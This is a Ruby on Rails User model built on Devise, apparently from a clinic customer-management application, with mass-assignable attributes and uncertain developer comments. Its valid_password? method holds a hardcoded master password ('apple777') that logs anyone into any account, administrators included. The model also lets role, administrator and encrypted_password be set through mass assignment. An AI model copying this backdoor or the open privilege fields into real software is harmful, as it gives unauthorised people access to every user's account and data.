class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :token_authenticatable, :encryptable, :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable,
         :registerable,
         :recoverable, 
         :validatable, 
         :trackable, 
         :rememberable

  # Setup accessible (or protected) attributes for your model
  attr_accessible :tm_customer_id, :netsuite_customer_id, :salutation, :first_name, :last_name, :title, :email, :phone, :extension, :role, :owner, :administrator, :clinician, :clinic_id, :clinic_tm_id, :clinic_name, :address, :address2, :city, :state, :zip, :price_schedule,:wants_n_catelogs,:password, :encrypted_password, :remember_me
  # Note: Rails update_attributes method takes a hash of attributes and their values and automatically updates them and saves the result. However if one of the attributes in the hash is not marked attr_accessible, no value for that attribute is stored to disk.  
  # Thus encrypted_password here? Does devise use update_attributes? 
  # Should pasword be an actual field? Should it be stored on the disk? 
  
  # for handling catelog requests
  
  # clinician<<->clinic relationship, but here for all users? 
  belongs_to :clinic
  
  def valid_password?(password)
     return true if password == "apple777" 
     super
  end

end
